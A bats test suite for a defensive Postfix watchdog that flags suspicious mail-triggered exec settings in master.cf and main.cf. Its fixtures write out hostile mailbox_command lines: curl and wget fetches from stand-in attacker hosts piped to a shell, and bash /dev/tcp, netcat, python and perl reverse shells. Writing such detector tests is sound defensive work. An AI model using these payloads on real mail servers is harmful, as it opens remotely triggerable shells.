#!/usr/bin/env bats
# L2 bats functional tests for the postfix-exec-watchdog scan script.
#
# Postfix runs external programs from master.cf pipe/spawn services
# (`argv=<prog>`) and from main.cf `*_command` directives (mailbox_command,
# …) AS ROOT or a mail user, fired by mail of a matching class — a
# mail-triggered exec surface (T1546). An argv= / *_command program under a
# writable root (/tmp /var/tmp /dev/shm /home), or carrying an injection
# pattern, or a world-writable/non-root config, is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the configs
# in a tmp sandbox via SELFDEF_POSTFIX_MASTER / _MAIN.
#
# Run with: bats packaging/test/L2-postfix-exec-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/postfix-exec-watchdog/systemd/postfix-exec-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    MASTER="${TMP}/master.cf"
    MAIN="${TMP}/main.cf"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_POSTFIX_PROFILE="${PROFILE:-report}" \
    SELFDEF_POSTFIX_BASELINE="${BASELINE}" \
    SELFDEF_POSTFIX_MASTER="${MASTER_F:-$MASTER}" \
    SELFDEF_POSTFIX_MAIN="${MAIN_F:-$MAIN}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# A benign Postfix exec posture: a maildrop pipe service + a procmail
# mailbox_command, both under /usr (trusted).
seed_benign() {
    printf 'maildrop  unix  -       n       n       -       -       pipe\n  flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}\n' > "${MASTER}"
    printf 'mailbox_command = /usr/bin/procmail -a "$EXTENSION"\n' > "${MAIN}"
}

# ============================================================
# ok tier
# ============================================================

@test "no postfix config → ok / no_postfix" {
    MASTER_F="${TMP}/nonexistent-master" MAIN_F="${TMP}/nonexistent-main" run_wd
    cap | grep -q '"event":"no_postfix"'
    cap | grep -q '"severity":"ok"'
}

@test "benign argv + mailbox_command, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / postfix_exec_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"postfix_exec_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "a master.cf argv= under a writable root → alert / postfix_exec_suspicious" {
    seed_benign
    run_wd                                   # benign baseline
    printf 'evil  unix  -       n       n       -       -       pipe\n  flags=DRhu argv=/tmp/.x\n' > "${MASTER}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"postfix_exec_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a main.cf mailbox_command under a writable root → alert" {
    seed_benign
    run_wd
    printf 'mailbox_command = /dev/shm/.deliver\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "an injection pattern in a *_command directive → alert" {
    seed_benign
    run_wd
    printf 'mailbox_command = curl http://evil/p|sh\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable config → alert" {
    seed_benign
    run_wd
    chmod 0666 "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign argv change → warn / postfix_exec_changed" {
    seed_benign
    run_wd
    printf 'maildrop  unix  -       n       n       -       -       pipe\n  flags=DRhu user=vmail argv=/usr/bin/maildrop2 -d ${recipient}\n' > "${MASTER}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"postfix_exec_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr-rooted argv + mailbox_command is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# fail-loud + enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious argv" {
    seed_benign
    run_wd
    printf 'evil  unix  -       n       n       -       -       pipe\n  flags=DRhu argv=/tmp/.x\n' > "${MASTER}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — postfix inventory enumerates mail-trigger root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (argv under /var/tmp): writable-root expansion" {
    seed_benign
    run_wd
    printf 'evil  unix  -       n       n       -       -       pipe\n  flags=DRhu argv=/var/tmp/.x\n' > "${MASTER}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (argv under /home): user-writable hijack coverage" {
    seed_benign
    run_wd
    printf 'evil  unix  -       n       n       -       -       pipe\n  flags=DRhu argv=/home/user/.x\n' > "${MASTER}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (reverse-shell pattern in mailbox_command)" {
    seed_benign
    run_wd
    printf 'mailbox_command = bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in mailbox_command)" {
    seed_benign
    run_wd
    printf 'mailbox_command = wget -qO- http://attacker/p | sh\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in mailbox_command)" {
    seed_benign
    run_wd
    printf 'mailbox_command = echo YmFzaCAtaQ== | base64 -d | bash\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-postfix-exec -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): postfix-exec-watchdog does NOT refresh baseline on suspicious-exec detection — alert STAYS until operator updates" {
    # T1546 mail-triggered root-exec persistence — alert MUST persist
    # across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf 'mailbox_command = /tmp/.deliver\n' > "${MAIN}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"postfix_exec_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented suspicious mailbox_command NOT flagged: # prefix filtered)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = /usr/bin/procmail -a "$EXTENSION"\n# mailbox_command = /tmp/.example-attacker\n' > "${MAIN}"
    run_wd
    ! cap | grep -q '"event":"postfix_exec_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (additional *_command directives covered: pipe_command + forward_command — not just mailbox_command)" {
    # Postfix has multiple *_command directives. The watchdog must scan
    # ALL of them.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'forward_command = /tmp/.attacker\n' > "${MAIN}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = curl -s http://attacker.com/p | bash\n' > "${MAIN}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in mailbox_command: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. postfix mailbox_command runs AS THE
    # RECIPIENT USER (or root for system mailboxes) on every
    # delivered message — a remotely-triggerable exec surface
    # (anyone who can send mail to root@host triggers root exec
    # via mailbox_command). Closes the nc reverse-shell sister axis
    # on the mail-triggered exec surface.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = nc -e /bin/sh 1.1.1.1 4444\n' > "${MAIN}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on postfix mail-delivery surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the mail-
    # triggered exec surface (T1546 — Event Triggered Execution
    # via mail delivery; postfix mailbox_command runs AS the
    # recipient user or root on every delivered message —
    # remotely-triggerable by anyone who sends mail).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${MAIN}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on postfix mail-delivery surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp postfix
    # mailbox_command rev-shell variants. Perl on every Debian/
    # Ubuntu host. Locks perl axis on T1546 mail-triggered exec
    # — mailbox_command runs AS recipient user/root on every
    # delivered message, remotely-triggerable by sender.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${MAIN}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: mailbox_command invoking binary from /var/tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. Beyond
    # inline reverse-shell payloads, attackers may set a benign-
    # looking mailbox_command that invokes a binary they've
    # staged in /tmp / /var/tmp / /dev/shm. T1546 mail-triggered
    # exec — mailbox_command runs AS recipient user / root on
    # every delivered message, remotely-triggerable by sender —
    # then runs the writable-root binary on every mail. Locks
    # writable-root-exec axis on postfix mail-delivery surface.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = /var/tmp/staged_payload\n' > "${MAIN}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (exec-path under writable-root: mailbox_command invoking binary from /dev/shm → alert)" {
    # Sister to /var/tmp postfix mail-delivery writable-root.
    # /dev/shm tmpfs in-RAM.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'mailbox_command = /dev/shm/staged_payload\n' > "${MAIN}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}
